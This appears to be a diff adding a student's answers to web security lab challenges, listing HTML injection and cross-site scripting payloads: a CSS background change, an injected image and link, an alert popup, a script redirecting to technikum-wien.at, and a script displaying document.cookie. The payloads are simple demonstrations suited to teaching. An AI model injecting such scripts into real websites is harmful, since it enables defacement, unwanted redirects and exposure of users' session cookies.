@@ -1,0 +1,20 @@
+
+<!--Challenge 1: Site Defacing / HTML Injections-->
+
+<!--Set background Set the background to a different color-->
+<style>body { background-color: yellow; }</style>
+<!--Display another image on the website-->
+<img src="https://cdn.expertphotography.com/wp-content/uploads/2022/03/What-Are-Stock-Photos-Ale-Bloshka.jpg" alt="XSS Image" style="width:300px; height:auto;">
+<!-- Create a link on the website-->
+<a href="https://www.technikum-wien.at/" target="_blank">Click me</a>
+
+<!--Challenge 2: JavaScript / Cross Site Scripting-->
+
+<!--Popup: Display a message to the client-->
+<script>alert('Hello, this is an XSS Popup!');</script>
+<!--Redirect the client to some other website-->
+<script>window.location='https://www.technikum-wien.at';</script>
+<!--Create a session with the server and display the current sesssion ID-->
+<script>alert(document.cookie);</script>
+<!--Try to load JS code from a different web source into the website-->
+
